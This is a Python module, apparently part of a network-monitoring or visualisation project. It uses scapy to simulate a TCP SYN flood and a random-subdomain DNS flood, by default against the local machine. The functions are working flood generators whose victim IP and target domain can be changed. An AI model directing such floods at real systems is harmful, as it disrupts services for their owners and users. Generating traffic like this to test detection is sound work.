from random import randint
from scapy.layers.dns import DNS, DNSQR
from scapy.layers.inet import IP, TCP, UDP
from scapy.packet import Raw
from scapy.sendrecv import send
from scapy.volatile import RandShort, RandString
from visualisation import get_local_ip


def simulate_syn_flood(interface, victim_ip=None, target_port=80, count=250, packet_size=1024):
    # Generate SYN Flood packets with a smaller Raw payload
    if not victim_ip:
        victim_ip = get_local_ip()

    ip_layer = IP(dst=victim_ip)
    tcp_layer = TCP(sport=RandShort(), dport=target_port, flags="S")
    raw_payload = Raw(b"SYN_Flood_" + b"X" * (packet_size - 23))
    packet = ip_layer / tcp_layer / raw_payload

    for _ in range(count):
        send(packet, iface=interface, verbose=0)


def simulate_dns_flood(interface, victim_ip=None, target_port=53, count=500):
    if not victim_ip:
        victim_ip = get_local_ip()

    ip_layer = IP(dst=victim_ip)
    udp_layer = UDP(sport=randint(1024, 65535), dport=target_port)

    # Craft DNS queries with randomized subdomains
    domain = "example.com"  # Replace with a target domain if needed
    for _ in range(count):
        subdomain = RandString(12).decode()  # Generate random subdomain
        dns_layer = DNS(rd=1, qd=DNSQR(qname=subdomain + '.' + domain))
        packet = ip_layer / udp_layer / dns_layer
        send(packet, iface=interface, verbose=0)
